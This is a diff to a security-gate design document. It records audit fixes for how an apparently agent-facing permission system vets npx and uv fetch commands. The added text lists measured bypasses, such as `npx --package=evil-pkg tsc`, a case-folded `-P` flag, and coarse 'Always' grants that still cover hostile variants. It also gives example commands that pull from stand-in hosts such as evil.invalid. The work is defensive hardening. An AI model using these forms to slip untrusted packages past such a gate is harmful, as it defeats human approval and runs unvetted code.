@@ -1360,7 +1360,8 @@ class"). Suite 3229.
 ## 6. Round-6 audit grill — resolved decisions (2026-10-17)
 
 **Status: DECIDED.** G1, G2, G5 and G6 are BUILT (3.38.0 — `85beef0`, `181e7eb`,
-`a0f7a2d`, `2b6494b`, `6fb30b1`); G3/G4 and G7–G11 are not built. Resolved by grilling the 2026-10-17
+`a0f7a2d`, `2b6494b`, `6fb30b1`); G3 and G4 are BUILT (3.39.0 — `81975bb`,
+`38b8a2d`), G7 too (same release, this revision); G8–G11 and G13 are not built. Resolved by grilling the 2026-10-17
 handoff
 audit (Joplin note `67dc875e13594e61b8083dd275924487`) against `3.37.1`
 (`8e57693`). Its own baseline was `3.32.0` — a stale, gitless Mac copy — so its
@@ -1530,6 +1531,67 @@ the rest were closed by 3.33–3.37. Each release below carries its rows as
    `uvx --from`) has its value extracted and faces the existing dep-trust check;
    an unresolvable value (`--python "$PY"`) marks the segment ungrantable.
    Verified live: `uv run -w evil-pkg python3 <trusted script>` auto-allowed.
+   *(Built, 3.39.0.)* Two tables answer it: `FETCH_PKG_SELECT` (which flag names
+   a fetched package, per family — npm `{-p,--package}`, uv `{--from}`, bun
+   `{--package}` long form only) and uv's option classes over
+   `UV_VALUE_FLAGS` (`config/bash-patterns.ts`, `config/trusted-scripts.ts`).
+   Deviations from the wording above, all measured:
+   - **The fetch set, not the first word after the flags.** `fetchFormScan` names
+     EVERY package a form selects, and with a select flag the trailing word is
+     the command run from inside the selected package(s) — `npx -p typescript
+     tsc` fetches `typescript` alone. That misreading was the hole: `npx
+     --package=evil-pkg tsc` was vouched for by Trust for `tsc`, a package it
+     never fetched (floor: PASS at 3.38.0 → `untrusted package (npx evil-pkg)`).
+   - **Select flags are per family.** uv's `-p` is `--python`, not `--package`,
+     so `uvx -p /tmp/evil/python tsc` fetches nothing; the option instead decides
+     the interpreter, and its path value is what the floor stops on
+     (`unvetted run-form option (uvx)`; 3.38.0's stop reason named the python
+     path as a *package*).
+   - **Value-extracting ≠ value-grantable.** Of the spec's list only the dep
+     flags (`--with`, `-w`, `-E`, `--with-editable`, `--with-requirements`) reach
+     the dep-trust check; `--project`, `--directory`, `--env-file`,
+     `--config-file`, `--index-url`/-i, `--find-links`/-f name a source or an
+     index no grant ever saw, so they are simply not benign and the form prompts
+     (`uv run --project /tmp/evil-proj <trusted script>`: corpus auto-allow →
+     stop). `--python <version>` keeps its identity-item treatment (value in the
+     signature, trust kept); a path-valued one must resolve inside base ∪
+     trusted-script dirs.
+   - **One arity table, three consumers.** `UV_VALUE_FLAGS` (49 value-taking
+     names, generated from the pinned `uv run --help` dump — 83 options — in
+     `/tmp/hfp/uvrun-flags.txt`) is used by the fetch scan, by `findScriptOperand`
+     (whose older local list lacked `--color`, so `uv run --color never <skills
+     script>` read `never` as the payload and lost the umbrella — now auto-allow)
+     and by uv's own option walk. Anything not in the table is ASSUMED to take a
+     value and is not benign: unknown is never benign. Option names are matched
+     case-sensitively for shorts — folding made `uv run -P pandas …` (`-P` is
+     `--upgrade-package`) read as `--python pandas` and auto-allow.
+   - **The `uv` family's run forms are scanned as one class.** `uvx`, `uv x`,
+     `uv tool run` and `uv run` share the walk; 3.38.0 never scanned the two-word
+     form, so `uv tool run evil-pkg tsc` is newly fetch-gated.
+   - **Grant identity now names option values** (`uvx --python /tmp/evil/python`,
+     `uv run --with pymupdf`, wrapped `timeout uv run --with pandas`), and
+     `getCommandSignature` runs the uv signature for `uvx` too (was `uv` only).
+     Accepted cost: a re-approval for previously granted wrapped/option-bearing uv
+     forms — a grant stored for `uvx --python 3.12` no longer covers a different
+     interpreter, which is the point.
+   - **An unnameable value fails closed with no Always offered**: `npx -p "$PKG"
+     tsc`, `uvx --with "$PKG" tsc` mark the segment ungrantable, and the prompt
+     says so ("a value it needs is not a name yet").
+   - **Limits, accepted:** npm-family options are not vetted by name beyond the
+     select flags — but an unmodelled flag's value lands in the fetch set, so the
+     command names a package no Trust can hold (`npx --registry
+     http://evil.invalid tsc` → `untrusted package (npx http://evil.invalid)`).
+     And the coarse-grant half is open for the npm family and `uv tool run`
+     (**G13**, item 13): an "Always" on `npx tsc --noEmit` stores `npx tsc`,
+     which prefix-covers `npx --package=evil-pkg tsc` (measured auto-allow).
+     Closed for `uvx` by the signature change.
+   Measurements: suite 4215 → 4237 (`test/runner-flags.test.ts`, P16 in
+   `test/verified-bypasses.test.ts`, the D10 rows in `test/dspa-gate.test.ts`);
+   round-6 manual corpus 4 → 3 open rows of 62 (the closed row is `uv run
+   --project /tmp/evil-proj …`; the remainder are the three G8 shadowing rows);
+   dspa floor 7 → 8 stops of 31 (the new stop is `npx --package=evil-pkg tsc`,
+   i.e. the hole itself). Baselines in `/tmp/hfp/g7-3380.txt` (3.38.0) and
+   `/tmp/hfp/g7-before.txt` (pre-G7 HEAD).
 8. **G8 — reversal, recorded: variable shadowing taints at the minting site.**
    The 3.29.0 round deliberately did NOT record compound-body assignments
    ("assumes the body ran" → fail-open). Reversed: a compound-body
@@ -1560,9 +1622,22 @@ the rest were closed by 3.33–3.37. Each release below carries its rows as
     calibration data §5 Q10 says future widening must be armed with.
 12. **G12 — phasing.** 3.38.0 = the stage model (G1/G2/G5/G6) as one coherent
     parse change; 3.39.0 = the bar model (G3) + `argv0` (G4) + flag tables
-    (G7); 3.39.x = grants/UI/judge (G8/G9/G10/G11) plus the independent
+    (G7); 3.39.x = grants/UI/judge (G8/G9/G10/G11, G13) plus the independent
     one-line surgical fixes (Write-prompt `Always` suppressed by a Read grant,
     `retryJudge` skipping `judgeWriteOutside`, `isInsideCwd` not realpath-ing
     `cwd`, `sanitizeDirs` normalization). A `/dspa` replay round runs after
     3.38.0: the round-1–5 ledger corpus is gone (`DECISION_LOG_ENABLED = false`),
     so the decision log gets enabled to rebuild it going forward.
+13. **G13 — a coarse fetch-form signature grant vouches for option values it
+    never saw.** Not built (3.39.x; the label G12 is taken by the phasing item
+    above). The grant machinery excludes a fetch form's signature only when one
+    of its packages is UNTRUSTED (`fetchableSigs` in `decide/rule-generator.ts`),
+    so an "Always" on a fully trusted fetch form stores the coarse rule and that
+    rule then covers variants whose fetch the floor had stopped: `npx tsc
+    --noEmit` → rule `npx tsc` → `npx --package=evil-pkg tsc` auto-allows
+    (measured; the floor's stop is advisory). `uvx tsc` → rule `uvx` is the same
+    shape, and `uv tool run tsc` stores `uv tool`. G7 closed the `uvx` family by
+    making those signatures name their option values (`uvx --python …`,
+    `uvx --from …`), which is why the npm family and `uv tool run` are what
+    remain. The fix belongs on the grant side: a fetch-form rule must carry its
+    fetch set (or be refused for a form whose packages are named by flags).
